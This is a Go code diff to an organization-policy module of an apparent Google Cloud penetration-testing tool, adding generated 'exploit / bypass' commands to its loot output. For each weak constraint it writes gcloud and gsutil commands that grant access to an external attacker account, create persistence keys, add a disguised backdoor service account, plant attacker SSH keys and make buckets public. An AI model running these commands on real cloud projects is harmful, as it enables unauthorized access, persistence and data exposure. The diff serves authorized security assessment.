@@ -135,8 +135,12 @@ func (m *OrgPoliciesModule) addPolicyToLoot(projectID string, policy orgpolicyse
 	}
 
 	lootFile.Contents += fmt.Sprintf(
-		"## Constraint: %s (Project: %s)\n",
-		policy.Constraint, policy.ProjectID,
+		"# =============================================================================\n"+
+			"# CONSTRAINT: %s\n"+
+			"# =============================================================================\n"+
+			"# Project: %s\n",
+		policy.Constraint,
+		policy.ProjectID,
 	)
 
 	if policy.Description != "" {
@@ -159,13 +163,114 @@ func (m *OrgPoliciesModule) addPolicyToLoot(projectID string, policy orgpolicyse
 	}
 
 	lootFile.Contents += fmt.Sprintf(
-		"\n# Describe this policy:\n"+
+		"\n# === ENUMERATION COMMANDS ===\n\n"+
+			"# Describe this policy:\n"+
 			"gcloud org-policies describe %s --project=%s\n\n"+
 			"# Get effective policy (includes inheritance):\n"+
-			"gcloud org-policies describe %s --project=%s --effective\n\n",
+			"gcloud org-policies describe %s --project=%s --effective\n\n"+
+			"# List all constraints for this project:\n"+
+			"gcloud org-policies list --project=%s\n\n",
 		constraintName, policy.ProjectID,
 		constraintName, policy.ProjectID,
+		policy.ProjectID,
 	)
+
+	// Exploit/bypass commands based on specific constraint types
+	lootFile.Contents += "# === EXPLOIT / BYPASS COMMANDS ===\n\n"
+
+	switch constraintName {
+	case "iam.allowedPolicyMemberDomains":
+		if policy.AllowAll {
+			lootFile.Contents += "# [FINDING] Domain restriction is DISABLED (AllowAll) - any external identity can be granted access\n"
+			lootFile.Contents += fmt.Sprintf(
+				"# Grant access to external identity:\n"+
+					"gcloud projects add-iam-policy-binding %s --member=user:attacker@external.com --role=roles/viewer\n\n",
+				policy.ProjectID,
+			)
+		} else if !policy.Enforced {
+			lootFile.Contents += "# [FINDING] Domain restriction is NOT ENFORCED\n\n"
+		}
+
+	case "iam.disableServiceAccountKeyCreation":
+		if !policy.Enforced || policy.AllowAll {
+			lootFile.Contents += "# [FINDING] SA key creation is NOT restricted - create keys for persistence:\n"
+			lootFile.Contents += fmt.Sprintf(
+				"gcloud iam service-accounts keys create /tmp/sa-key.json --iam-account=SA_EMAIL@%s.iam.gserviceaccount.com\n\n",
+				policy.ProjectID,
+			)
+		} else {
+			lootFile.Contents += "# SA key creation is restricted - try alternative persistence methods:\n" +
+				"# - Workload identity federation\n" +
+				"# - Service account impersonation chain\n\n"
+		}
+
+	case "iam.disableServiceAccountCreation":
+		if !policy.Enforced || policy.AllowAll {
+			lootFile.Contents += "# [FINDING] SA creation is NOT restricted - create backdoor service accounts:\n"
+			lootFile.Contents += fmt.Sprintf(
+				"gcloud iam service-accounts create cloudfox-backdoor --display-name='System Service' --project=%s\n\n",
+				policy.ProjectID,
+			)
+		}
+
+	case "compute.requireShieldedVm":
+		if !policy.Enforced || policy.AllowAll {
+			lootFile.Contents += "# [FINDING] Shielded VM is NOT required - unshielded VMs can be created:\n" +
+				"# Boot integrity monitoring is not enforced\n\n"
+		}
+
+	case "compute.requireOsLogin":
+		if !policy.Enforced || policy.AllowAll {
+			lootFile.Contents += "# [FINDING] OS Login is NOT required - SSH keys can be added to project/instance metadata:\n"
+			lootFile.Contents += fmt.Sprintf(
+				"# Add SSH key to project metadata:\n"+
+					"gcloud compute project-info add-metadata --metadata=ssh-keys=\"attacker:ssh-rsa AAAA...\" --project=%s\n\n",
+				policy.ProjectID,
+			)
+		}
+
+	case "compute.vmExternalIpAccess":
+		if policy.AllowAll {
+			lootFile.Contents += "# [FINDING] External IP access is NOT restricted - VMs can have public IPs:\n" +
+				"# Any VM can be assigned a public IP for data exfiltration\n\n"
+		}
+
+	case "storage.uniformBucketLevelAccess":
+		if !policy.Enforced || policy.AllowAll {
+			lootFile.Contents += "# [FINDING] Uniform bucket access is NOT enforced - ACLs can be used:\n" +
+				"# Fine-grained ACLs allow per-object permissions that are harder to audit\n\n"
+		}
+
+	case "storage.publicAccessPrevention":
+		if !policy.Enforced || policy.AllowAll {
+			lootFile.Contents += "# [FINDING] Public access prevention is NOT enforced:\n"
+			lootFile.Contents += fmt.Sprintf(
+				"# Make a bucket publicly accessible:\n"+
+					"gsutil iam ch allUsers:objectViewer gs://BUCKET_NAME\n"+
+					"# Or set public ACL:\n"+
+					"gsutil acl ch -u AllUsers:R gs://BUCKET_NAME/OBJECT\n\n",
+			)
+		}
+
+	case "sql.restrictPublicIp":
+		if !policy.Enforced || policy.AllowAll {
+			lootFile.Contents += "# [FINDING] Public IP restriction is NOT enforced on Cloud SQL:\n" +
+				"# SQL instances can be created with public IPs\n\n"
+		}
+
+	case "sql.restrictAuthorizedNetworks":
+		if !policy.Enforced || policy.AllowAll {
+			lootFile.Contents += "# [FINDING] Authorized network restriction is NOT enforced:\n" +
+				"# 0.0.0.0/0 can be added to authorized networks\n\n"
+		}
+
+	default:
+		if policy.AllowAll {
+			lootFile.Contents += fmt.Sprintf("# [FINDING] Policy %s has AllowAll - constraint is effectively disabled\n\n", constraintName)
+		} else if !policy.Enforced {
+			lootFile.Contents += fmt.Sprintf("# [FINDING] Policy %s is not enforced\n\n", constraintName)
+		}
+	}
 }
 
 func (m *OrgPoliciesModule) writeOutput(ctx context.Context, logger internal.Logger) {
